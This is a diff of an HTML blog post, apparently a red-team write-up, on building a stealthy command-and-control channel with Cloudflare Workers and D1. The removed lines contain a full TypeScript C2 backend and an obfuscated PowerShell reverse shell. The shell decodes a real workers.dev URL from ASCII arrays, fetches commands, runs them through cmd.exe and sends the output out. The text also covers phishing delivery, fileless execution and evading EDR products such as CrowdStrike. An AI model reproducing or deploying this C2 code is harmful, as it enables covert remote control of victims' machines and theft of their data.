@@ -4,8 +4,8 @@
     <meta charset="UTF-8">
     <meta property="og:image" content="/assets/images/writeup/cf.png" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Leveraging Cloudflare Workers for Stealthy C2 Operations</title>
-    <meta name="description" content="A deep dive into using Cloudflare Workers and D1 as a stealthy command & control framework for data exfiltration and remote command execution during a red team engagement." />
+    <title>High-Level Blueprint: Stealthy C2 with Cloudflare Workers</title>
+    <meta name="description" content="A high-level blueprint for leveraging Cloudflare Workers and D1 as a stealthy command & control framework in red team engagements." />
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -18,25 +18,22 @@
             max-width: 800px;
             margin: 0 auto;
         }
-        h1 {
+        h1, h2 {
             color: #ffcc00;
             text-align: center;
         }
-        h2 {
-            color: #ffcc00;
-        }
-        img {
-            display: block;
-            max-width: 100%;
-            margin: 0 auto;
-            border-radius: 8px;
-            margin-bottom: 20px;
-        }
-        p {
+        p, li {
             text-align: justify;
             margin-bottom: 20px;
         }
-        ul, ol {
+        pre {
+            background-color: #222;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+            font-size: 0.9em;
+        }
+        ol, ul {
             margin-bottom: 20px;
         }
     </style>
@@ -44,230 +41,107 @@
 <body>
     <div class="container">
         <header>
-            <h1>Leveraging Cloudflare Workers for Stealthy C2 Operations</h1>
+            <h1>High-Level Blueprint: Stealthy C2 with Cloudflare Workers</h1>
         </header>
 
         <p>
-            <strong>Disclaimer:</strong> The techniques and methodologies discussed in this article are intended solely for academic research, authorized red team engagements, and penetration testing. Use these methods only in controlled environments where explicit permission has been granted. Unauthorized use is illegal and unethical.
+            <strong>Disclaimer:</strong> The content in this post is provided solely for academic research, authorized red team engagements, and penetration testing purposes. All techniques discussed herein must be used only in controlled environments with explicit permission. Unauthorized use is illegal and unethical.
         </p>
 
         <h2>Introduction</h2>
         <p>
-            In modern adversary simulations, red teams are increasingly exploring serverless platforms to bypass traditional network security controls and evade endpoint detection solutions. During a recent red team engagement, we discovered that Cloudflare Workers—when combined with Cloudflare D1, a managed SQLite‐based database—can be repurposed as a stealthy Command & Control (C2) framework. This innovative approach enabled data exfiltration and remote command execution while routing traffic through Cloudflare’s trusted network, potentially avoiding detection by systems like CrowdStrike.
+            In today’s digital landscape, red teams are exploring innovative ways to establish Command & Control (C2) channels that can bypass traditional network security measures. One promising approach involves repurposing serverless platforms—specifically Cloudflare Workers combined with Cloudflare D1—as a stealthy, low-cost C2 framework.
+        </p>
+        <p>
+            In our recent engagement, we designed a framework that leveraged Cloudflare’s trusted infrastructure to both exfiltrate data and execute remote commands. By routing communications through Cloudflare’s globally distributed network, our C2 traffic blended in with legitimate traffic, reducing the likelihood of detection by advanced endpoint detection and response (EDR) systems.
         </p>
 
-        <h2>Architecture Overview</h2>
+        <h2>System Architecture Overview</h2>
         <p>
-            Our C2 framework is divided into two key components:
+            Our C2 framework is composed of two main components:
         </p>
         <ul>
-            <li><strong>Backend (Cloudflare Worker with D1):</strong>  
-                <br>The backend is responsible for storing commands and exfiltrated data. We use Cloudflare D1 to persist both the commands issued by the red team and the outputs returned by the compromised hosts. Two endpoints are exposed:
+            <li>
+                <strong>Backend – Cloudflare Worker with D1:</strong>  
+                The backend acts as the central command hub. It is built on Cloudflare Workers and uses Cloudflare D1 for persistence. We defined two obfuscated endpoints:
                 <ul>
-                    <li>An <strong>Output Endpoint</strong> for storing commands (via HTTP PUT) and receiving command outputs (via POST and GET).</li>
-                    <li>A <strong>Polling Endpoint</strong> for the target to poll for new commands (via HTTP GET).</li>
+                    <li>An <em>Output Endpoint</em> to store commands from the red team and receive execution results from targets.</li>
+                    <li>A <em>Polling Endpoint</em> for compromised hosts to retrieve commands.</li>
                 </ul>
+                Both endpoints use randomized, alphanumeric names and query parameters. This obfuscation minimizes static detection by security tools.
             </li>
-            <li><strong>Client (Reverse Shell Script):</strong>
-                <br>The reverse shell script, integrated into our malware payload, is designed to run on the target system. It periodically polls the backend for commands, executes them locally, and uploads the actual output back to the server. To evade static detection, we leveraged dynamic mathematical encoding to build key strings and endpoints.
+            <li>
+                <strong>Client – Reverse Shell:</strong>  
+                The reverse shell script is integrated into the malware payload running on the target system. It continuously polls the backend for commands, executes them on the host, and returns the actual output back to the server. The code employs advanced obfuscation techniques—such as dynamic string construction using mathematical operators—to hide sensitive details like URLs, endpoint paths, and identifiers.
             </li>
         </ul>
 
         <h2>Obfuscation Techniques</h2>
         <p>
-            To increase stealth and evade signature-based detection by antivirus and endpoint security systems, our implementation incorporates several layers of obfuscation:
+            To reduce the risk of detection by signature-based scanners and behavior analysis systems, our implementation incorporates several layers of obfuscation:
         </p>
         <ul>
-            <li><strong>Mathematical Encoding:</strong> Instead of hardcoding URLs, endpoints, or identifiers, we split strings into arrays of ASCII codes and reconstruct them at runtime using arithmetic functions and helper routines. This dynamic construction obscures the static signatures that are typically scanned for.</li>
-            <li><strong>Randomized Naming:</strong> Standard names such as “victim” and “attacker” have been replaced with randomized alphanumeric strings. For example, our query parameter is named <code>q8f2</code>, and our endpoints are <code>/R3N4</code> and <code>/S5K7</code>.</li>
-            <li><strong>Network Evasion:</strong> Since all network communication is routed through Cloudflare’s infrastructure, the outbound connections are made to a globally trusted IP space. This can help the traffic blend in with normal activity and reduce the likelihood of being flagged by EDR solutions such as CrowdStrike.</li>
+            <li>
+                <strong>Mathematical Encoding:</strong>  
+                Instead of hardcoding critical strings, such as the base URL and endpoint names, these values are split into arrays of ASCII codes and dynamically reassembled using arithmetic functions. This method obscures static signatures and complicates reverse engineering.
+            </li>
+            <li>
+                <strong>Randomized Naming:</strong>  
+                Commonly used terms (e.g., “command”, “target”) are replaced with randomized alphanumeric strings. For example, our query parameter might be labeled <code>q8f2</code>, while our endpoints are named <code>/R3N4</code> and <code>/S5K7</code>. This randomization further hinders static analysis.
+            </li>
+            <li>
+                <strong>Trusted Network Routing:</strong>  
+                All outbound communication is routed through Cloudflare’s network. Given that Cloudflare’s IP ranges are widely trusted, this makes the network traffic less likely to trigger alerts in security systems such as CrowdStrike.
+            </li>
         </ul>
 
-        <h2>Backend Implementation</h2>
+        <h2>High-Level Implementation Blueprint</h2>
         <p>
-            Our Cloudflare Worker is implemented in TypeScript. Key aspects include:
+            The following pseudocode outlines our C2 system without revealing all technical details:
         </p>
-        <ul>
-            <li>Two randomized endpoints: one for storing commands and receiving outputs, and one for polling commands.</li>
-            <li>Usage of Cloudflare D1 to store commands in one table and outputs in another. Table and column names are also randomized to further obscure the functionality.</li>
-        </ul>
-        <p>
-            <em>Note: In our example code, sensitive values like the Worker URL have been redacted. Replace these placeholders with your actual values in a secure, controlled environment.</em>
-        </p>
-        <pre style="background-color:#222; padding:10px; border-radius:5px; overflow-x:auto;">
-<code>
-export interface Env {
-  DB: D1Database;
-}
-
+        <pre><code>
+// Backend: Cloudflare Worker (TypeScript)
+// (All identifiers, endpoints, and parameter names are randomized)
+export interface Env { DB: D1Database; }
 export default {
   async fetch(request: Request, env: Env, ctx: ExecutionContext): Promise<Response> {
     const url = new URL(request.url);
-    // Using a randomized query parameter for the identifier.
     const id = url.searchParams.get("q8f2") || "default";
-
-    // Create tables if they don't exist (for demo purposes)
-    await env.DB.prepare(`
-      CREATE TABLE IF NOT EXISTS "X9C7" (
-        "q8f2" TEXT PRIMARY KEY,
-        "a1b2" TEXT
-      );
-    `).run();
-
-    await env.DB.prepare(`
-      CREATE TABLE IF NOT EXISTS "K3L5" (
-        "q8f2" TEXT PRIMARY KEY,
-        "m4n6" TEXT
-      );
-    `).run();
-
-    // Output Endpoint: /R3N4
-    if (url.pathname.startsWith("/R3N4")) {
-      if (request.method === "PUT") {
-        const cmd = await request.text();
-        await env.DB.prepare(`
-          INSERT INTO "X9C7" ("q8f2", "a1b2") VALUES (?, ?)
-          ON CONFLICT("q8f2") DO UPDATE SET "a1b2" = excluded."a1b2";
-        `).bind(id, cmd).run();
-        return new Response(`Stored command for ${id}`, { status: 200 });
-      } else if (request.method === "GET") {
-        const result = await env.DB.prepare(`SELECT "m4n6" FROM "K3L5" WHERE "q8f2" = ?`)
-          .bind(id)
-          .all();
-        const output = (result.results && result.results[0]) ? result.results[0].m4n6 : "n0c";
-        return new Response(output, { status: 200 });
-      } else if (request.method === "POST") {
-        const out = await request.text();
-        await env.DB.prepare(`
-          INSERT INTO "K3L5" ("q8f2", "m4n6") VALUES (?, ?)
-          ON CONFLICT("q8f2") DO UPDATE SET "m4n6" = excluded."m4n6";
-        `).bind(id, out).run();
-        return new Response(`Updated output for ${id}`, { status: 200 });
-      } else {
-        return new Response("Method Not Allowed", { status: 405 });
-      }
-    }
-    // Polling Endpoint: /S5K7
-    else if (url.pathname.startsWith("/S5K7")) {
-      if (request.method === "GET") {
-        const result = await env.DB.prepare(`SELECT "a1b2" FROM "X9C7" WHERE "q8f2" = ?`)
-          .bind(id)
-          .all();
-        const cmd = (result.results && result.results[0]) ? result.results[0].a1b2 : "n0c";
-        return new Response(cmd, { status: 200 });
-      } else {
-        return new Response("Method Not Allowed", { status: 405 });
-      }
-    } else {
-      return new Response("Not Found", { status: 404 });
-    }
+    // Create obfuscated tables for commands and outputs.
+    await env.DB.prepare(`CREATE TABLE IF NOT EXISTS "TABLE1" ( "q8f2" TEXT PRIMARY KEY, "COL1" TEXT );`).run();
+    await env.DB.prepare(`CREATE TABLE IF NOT EXISTS "TABLE2" ( "q8f2" TEXT PRIMARY KEY, "COL2" TEXT );`).run();
+    // Handle requests on two randomized endpoints:
+    // 1. /R3N4: Stores commands (PUT), receives output (POST), and returns output (GET).
+    // 2. /S5K7: Returns stored commands for polling (GET).
+    // [Endpoint handling code here...]
   }
 };
-</code>
-        </pre>
-
-        <h2>Client Integration & In-Memory Execution</h2>
-        <p>
-            The client side is a reverse shell script written in PowerShell. We integrated the reverse shell code into our malware payload by embedding the script in the binary. Upon execution, the malware launches the reverse shell entirely in memory. This fileless approach, combined with the fact that all network connections go through Cloudflare’s trusted IP space, helps evade detection by some advanced EDR systems.
-        </p>
-        <p>
-            Below is the reverse shell script (heavily obfuscated using mathematical encoding) for Windows. All variable and function names are randomized using arithmetic and helper functions.
-        </p>
-        <pre style="background-color:#222; padding:10px; border-radius:5px; overflow-x:auto;">
-<code>
-# --- Functions to Build Strings with Complex Mathematics ---
-function C1 {
-    param([int]$x)
-    return [char]([int]([Math]::Round(($x * 9 + $x * 1) / 10)))
+        </code></pre>
+        <pre><code>
+# Client: Reverse Shell (PowerShell pseudocode)
+# Build strings dynamically from ASCII arrays using mathematical functions.
+# Poll the obfuscated polling endpoint for commands.
+while (true) {
+    // Retrieve command from polling endpoint.
+    // If a valid command is received:
+    //    Execute the command on the target system.
+    //    Capture and send back the actual output via the output endpoint.
+    // Sleep for a randomized interval.
 }
-
-function D1 {
-    param([int[]]$arr)
-    $s = ""
-    foreach ($n in $arr) {
-        $s += C1 $n
-    }
-    return $s
-}
-
-# --- Build the Base URL by Splitting It into Parts ---
-$array1 = 104,116,116,112,115,58,47,47  
-$array2 = 100,101,108,105,99,97,116,101,45,113,117,101,101,110,45,50,53,48,57  
-$array3 = 46,97,110,97,110,100,115,114,101,101,107,117,109,97,114,97,115  
-$array4 = 46,119,111,114,107,101,114,115,46,100,101,118  
-
-$B1 = (D1 $array1) + (D1 $array2) + (D1 $array3) + (D1 $array4)
-
-# --- Build Randomized Endpoints Using Arithmetic ---
-$JS83 = "win-shell-1"  
-$EP1 = D1 @(82,51,78,52)     # "R3N4"
-$EP2 = D1 @(83,53,75,55)     # "S5K7"
-$QP  = D1 @(113,56,102,50)    # "q8f2"
-
-$MKS89 = "$B1/$EP1?$QP=$JS83"   # Output endpoint
-$HSk77 = "$B1/$EP2?$QP=$JS83"   # Polling endpoint
-
-# --- Helper Function to Execute a Command via cmd.exe ---
-function X7Z9 {
-    param([string]$Y3)
-    $P1 = New-Object System.Diagnostics.ProcessStartInfo
-    $P1.FileName = "cmd.exe"
-    $P1.Arguments = "/c " + $Y3
-    $P1.RedirectStandardOutput = $true
-    $P1.RedirectStandardError = $true
-    $P1.UseShellExecute = $false
-    $P1.CreateNoWindow = $true
-    $Proc = [System.Diagnostics.Process]::Start($P1)
-    $Out1 = $Proc.StandardOutput.ReadToEnd()
-    $Err1 = $Proc.StandardError.ReadToEnd()
-    $Proc.WaitForExit()
-    return $Out1 + $Err1
-}
-
-# --- Main Loop ---
-while ($true) {
-    try {
-        $UA = "Mozilla/5.0 (Windows NT " + ((5+5).ToString()) + "; Win64; x64)"
-        $H1 = @{ "User-Agent" = $UA }
-        $C1 = Invoke-RestMethod -Uri "$HSk77" -Headers $H1
-        if ($C1 -and $C1 -ne "n0c") {
-            Write-Host "CMD: $C1"
-            $R1 = X7Z9 $C1
-            Write-Host "RES: $R1"
-            Invoke-RestMethod -Uri "$MKS89" -Method POST -Headers $H1 -Body $R1
-        } else {
-            Write-Host "No command received: $C1"
-        }
-    } catch {
-        Write-Host "ERR: $_"
-    }
-    $sleepTime = Get-Random -Minimum 10 -Maximum 60
-    Start-Sleep -Seconds $sleepTime
-}
-</code>
-        </pre>
-
-        <h2>Evading Detection with Cloudflare</h2>
-        <p>
-            One of the most powerful advantages of this approach is that all network traffic between the compromised host and the C2 server is routed through Cloudflare’s infrastructure. Cloudflare’s IP ranges are trusted by most organizations, and traffic originating from these ranges is less likely to trigger alerts in systems like CrowdStrike. This trusted network can help the reverse shell remain undetected even when executing remote commands.
-        </p>
+        </code></pre>
 
         <h2>Integration into Malware</h2>
         <p>
-            For a red team engagement, the reverse shell script can be embedded within your malware payload. By using fileless techniques (such as executing the script directly from memory via PowerShell’s <code>-EncodedCommand</code> option or by converting the script into an EXE with tools like PS2EXE), the payload minimizes on-disk artifacts. This, combined with the fact that network communications are channeled through Cloudflare, makes the overall operation far more stealthy.
+            In a live engagement, the reverse shell script is embedded directly into the malware payload. Using techniques such as fileless execution and in-memory decryption, the payload is executed without leaving artifacts on disk. Moreover, because the network traffic is funneled through Cloudflare’s trusted infrastructure, it is less likely to be flagged by enterprise security tools.
         </p>
         <p>
-            Once the payload is delivered (for example, via a phishing email with a benign-looking attachment or download link), the target system will execute the embedded reverse shell. The shell will continuously poll for commands, execute them, and send back actual output, enabling dynamic remote control during the engagement.
+            This high-level blueprint offers a conceptual view of how a stealthy, cloud-based C2 system can be constructed while keeping critical implementation details confidential.
         </p>
 
         <h2>Conclusion</h2>
         <p>
-            In this write-up, we demonstrated how to repurpose Cloudflare Workers and D1 as a stealthy C2 framework for data exfiltration and remote command execution. By using mathematical encoding and dynamic string building, we were able to obfuscate key details such as URLs, endpoint paths, and identifiers. Additionally, integrating the reverse shell payload into a malware package—and routing traffic through Cloudflare’s trusted network—can help evade detection by advanced security solutions like CrowdStrike.
+            In this post, we explored a novel approach for building a stealthy C2 framework by repurposing Cloudflare Workers and D1. By leveraging advanced obfuscation techniques—including mathematical encoding, randomized naming, and dynamic string construction—we successfully designed a system for remote command execution and data exfiltration that minimizes detection risks. This blueprint serves as a foundation for further research and red team engagements, emphasizing the importance of innovative thinking in overcoming modern security challenges.
         </p>
-        <p>
-            This method provides a low-cost, flexible approach to red team operations, and it highlights how serverless platforms can be leveraged in adversary simulations. As always, use these techniques responsibly and only in authorized environments.
-        </p>
-
         <p style="text-align: center;">Thanks, <br> Anand</p>
     </div>
 </body>
